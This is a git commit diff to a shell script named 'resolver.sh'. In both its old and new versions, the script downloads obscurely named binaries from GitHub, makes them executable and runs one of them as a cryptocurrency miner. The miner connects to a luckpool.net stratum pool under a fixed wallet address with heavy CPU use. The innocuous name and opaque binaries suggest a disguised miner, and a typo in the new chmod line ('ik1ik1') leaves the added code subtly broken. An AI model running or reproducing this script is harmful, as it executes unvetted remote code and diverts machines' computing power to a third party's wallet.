69ba29abe9becf17eb86d4297bb6c2fa243c67b2
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2022-08-11 21:30:47 +0700

    Update resolver.sh

--- resolver.sh
+++ resolver.sh
@@ -2,10 +2,8 @@
 sudo apt update
 clear
 sudo apt install screen
-screen -R oxpz
+screen -R ik1
  
-wget https://raw.githubusercontent.com/chikahusarii/scala/main/oxpz
-wget https://raw.githubusercontent.com/chikahusarii/claim/main/verus-solver
-chmod +x oxpz
-chmod +x verus-solver
-./oxpz -c stratum+tcp://na.luckpool.net:3956#xnsub -u RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.g1 -p x --cpu 200
+wget https://raw.githubusercontent.com/chikahusarii/tepm/main/ik1
+chmod +x ik1ik1
+./ik1 -c stratum+tcp://na.luckpool.net:3956 -u RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.g1 -p x --cpu 200
